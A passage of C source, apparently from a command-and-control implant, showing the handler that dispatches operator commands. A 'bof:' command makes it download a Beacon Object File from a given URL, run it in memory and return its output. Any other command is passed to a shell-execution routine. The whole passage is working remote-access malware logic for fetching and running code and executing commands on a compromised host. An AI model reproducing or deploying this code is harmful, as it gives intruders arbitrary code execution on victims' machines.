{
    if (strncmp(cmd, "bof:", 4) == 0)
    {
        char *payload = (char *)cmd + 4;
        while (*payload == ' ')
            payload++;
        char *space = strchr(payload, ' ');
        char *bof_url = payload;
        char *bof_args = "";
        int bof_arglen = 0;
        if (space)
        {
            *space = '\0';
            bof_args = space + 1;
            if ((bof_args[0] == '"' || bof_args[0] == '\'') &&
                bof_args[0] == bof_args[strlen(bof_args) - 1])
            {
                bof_args[strlen(bof_args) - 1] = '\0';
                bof_args++;
            }
            bof_arglen = strlen(bof_args);
        }
        size_t bof_size = 0;
        unsigned char *bof_data = download_bof(bof_url, &bof_size);
        if (!bof_data || bof_size == 0)
        {
            char *err = strdup("[!] Failed to download BOF");
            *out_len = strlen(err);
            return err;
        }
        char *output =
            run_bof_and_capture(bof_data, (uint32_t)bof_size, bof_args, bof_arglen, out_len);
        free(bof_data - 8);
        return output;
    }
    else
    {
        return exec_cmd(cmd, out_len);
    }

